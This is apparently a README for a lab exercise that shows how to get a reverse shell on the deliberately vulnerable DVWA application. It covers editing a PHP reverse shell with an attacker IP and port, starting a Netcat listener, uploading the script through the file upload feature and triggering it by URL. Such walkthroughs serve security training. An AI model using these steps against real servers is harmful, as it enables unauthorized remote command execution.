# DVWA Reverse Shell with Netcat and PHP Reverse Shell

This project demonstrates how to perform a reverse shell attack on the DVWA (Damn Vulnerable Web Application) using Netcat and a PHP reverse shell script.

---

## Requirements

- Kali Linux with Netcat installed  
- A DVWA server accessible on your network  
- Your Kali Linux IP address: `192.168.237.130`  
- A port to listen on: `5555`

---

## How It Works

You start a Netcat listener on your Kali machine, upload the PHP reverse shell script (`php-reverse-shell.php`) to the DVWA file upload feature, and then execute it via a web browser. This triggers a reverse shell connection back to your Kali machine, where you get remote command execution on the DVWA server under the `www-data` user.

---

## Usage Instructions
Edit the `php-reverse-shell.php` file to replace the IP and port with your Kali machine details:

```php
$ip = '192.168.237.130';  // Your Kali Linux IP address
$port = 5555;             // Port to listen on


## Start the Netcat listener on Kali:

nc -lvnp 5555

Upload the php-reverse-shell.php file to DVWA using the file upload functionality. You should see a confirmation message similar to:

Vulnerability: File Upload
Choose an image to upload:

../../hackable/uploads/php-reverse-shell.php successfully uploaded!

--- 
Trigger the reverse shell by accessing the uploaded PHP script via your browser:

http://192.168.237.131/dvwa/hackable/uploads/php-reverse-shell.php

---

Once triggered, your Kali terminal running Netcat will show output like this:

─$ nc -lvp 5555
